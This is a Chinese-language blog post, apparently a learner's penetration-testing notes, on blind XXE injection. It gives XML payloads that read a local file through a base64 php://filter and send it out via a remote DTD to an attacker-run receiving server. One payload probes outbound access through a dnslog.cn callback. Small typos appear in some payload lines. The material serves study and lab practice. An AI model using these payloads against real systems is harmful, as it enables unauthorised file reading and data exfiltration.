{"title":"渗透测试笔记 - day23 盲XXE","date":"2023-03-16T17:42:18.118Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day23 盲XXE","updated":"2023-03-17T04:59:12.783Z","content":"<h2 id=\"php中的文件写入函数\">PHP中的文件写入函数<a title=\"#php中的文件写入函数\" href=\"#php中的文件写入函数\"></a></h2>\n<p>file_put_contents函数：写入文件。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;123.txt&quot;</span>,<span class=\"string\">&quot;PHP是世界上最好的语言&quot;</span>)</span><br><span class=\"line\">    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"参数实体\">参数实体<a title=\"#参数实体\" href=\"#参数实体\"></a></h2>\n<p>如下面这个例子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">    &lt;!ENTITY % hack &quot;&lt;!ENTITY admin SYSTEM &#x27;file:///c:/123.txt&#x27;&gt;&quot;&gt;%hack;</span><br><span class=\"line\">    ]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p>hack为参数实体，他可定义其他实体为自己并可被其他实体所调用。</p>\n<h2 id=\"盲xxe\">盲XXE<a title=\"#盲xxe\" href=\"#盲xxe\"></a></h2>\n<h3 id=\"使用dnslog验证漏洞并验证是否可出网\">使用DNSLOG验证漏洞并验证是否可出网<a title=\"#使用dnslog验证漏洞并验证是否可出网\" href=\"#使用dnslog验证漏洞并验证是否可出网\"></a></h3>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;CTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">    &lt;!ENTITY admin SYSTEM &quot;http://5x6ghq.dnslog.cn/1.xml&quot;&gt;</span><br><span class=\"line\">    ]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959379.png\" alt=\"image-20220301192456487\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959609.png\" alt=\"image-20220301192432028\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"使用公网vps创建数据接受点\">使用公网VPS创建数据接受点<a title=\"#使用公网vps创建数据接受点\" href=\"#使用公网vps创建数据接受点\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303111959324.png\" alt=\"image-20220301211419920\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问测试</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000193.png\" alt=\"image-20220301211513285\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000288.png\" alt=\"image-20220301211537463\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"构造payload\"><strong>构造payload</strong><a title=\"#构造payload\" href=\"#构造payload\"></a></h3>\n<p>首先需要构造想要非法访问的文件内容，base64转码后，作为参数传递给C&amp;C服务器的接受点。</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=conver.base64-encode/resource=c:/123.txt&quot;&gt; </span><br></pre></td></tr></table></figure>\n<p>设立远程连接至C&amp;C服务器的XML-DTD文件里</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:7790/back/back.xml&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>XML文件里写入读取文件的参数实体。</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000669.png\" alt=\"image-20220301213906214\" loading=\"lazy\" class=\"φbp\"></p>\n<p>最终payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE user [</span><br><span class=\"line\">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/123.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:7790/back/back.xml&quot;&gt;</span><br><span class=\"line\">%remote;</span><br><span class=\"line\">%all;</span><br><span class=\"line\">    ]&gt;</span><br><span class=\"line\">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</span><br></pre></td></tr></table></figure>\n<p>发送注入包。</p>\n<p>读取back.txt并解码！</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000331.png\" alt=\"image-20220301214049252\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202303112000980.png\" alt=\"image-20220301214437394\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成攻击。</p>\n","prev":{"title":"渗透测试笔记 - day24、25、26、27 文件上传","link":"2023/03/16/渗透测试笔记 - day24、25、26、27 文件上传"},"next":{"title":"渗透测试笔记 - day22 XXE实体注入","link":"2023/03/16/渗透测试笔记 - day22 XXE实体注入"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day23 盲XXE/","toc":[{"id":"php中的文件写入函数","title":"PHP中的文件写入函数","index":"1"},{"id":"参数实体","title":"参数实体","index":"2"},{"id":"盲xxe","title":"盲XXE","index":"3","children":[{"id":"使用dnslog验证漏洞并验证是否可出网","title":"使用DNSLOG验证漏洞并验证是否可出网","index":"3.1"},{"id":"使用公网vps创建数据接受点","title":"使用公网VPS创建数据接受点","index":"3.2"},{"id":"构造payload","title":"构造payload","index":"3.3"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day23 盲XXE/\" title=\"渗透测试笔记 - day23 盲XXE\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day23 盲XXE/</a>"},"reading_time":"429 words in 3 min"}